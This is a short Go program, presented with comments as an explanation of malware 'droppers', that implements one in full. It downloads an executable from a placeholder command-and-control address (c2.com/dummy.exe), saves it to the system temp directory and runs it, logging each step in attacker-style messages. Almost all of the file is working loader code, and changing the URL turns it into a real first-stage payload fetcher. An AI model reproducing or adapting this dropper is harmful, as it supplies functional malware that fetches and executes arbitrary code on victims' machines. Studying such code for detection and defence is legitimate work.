// A dropper is a type of malware whose primary purpose is to download, write,
// and often execute a secondary payload (malicious binary) on a target machine.
// It is commonly used in the initial stages of an attack chain to install more sophisticated malware.

// Droppers are often:

// Obfuscated or encrypted to evade detection.
// Packed inside phishing documents, EXE binaries, or other initial access vectors.
// Programmed to connect to a remote server (C2) to fetch malicious payloads.

package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
)

func main() {
	url := "http://c2.com/dummy.exe"
	targetPath := filepath.Join(os.TempDir(), "demo-payload.exe")

	fmt.Println("[*] Downloading payload...")
	err := downloadFile(url, targetPath)
	if err != nil {
		fmt.Printf("[-] Download failed: %v\n", err)
		return
	}
	fmt.Printf("[+] Downloaded to: %s\n", targetPath)

	fmt.Println("[*] Executing payload...")
	err = exec.Command(targetPath).Start()
	if err != nil {
		fmt.Printf("[-] Execution failed: %v\n", err)
		return
	}

	fmt.Println("[+] Payload executed.")
}

func downloadFile(url string, filepath string) error {
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	return err
}
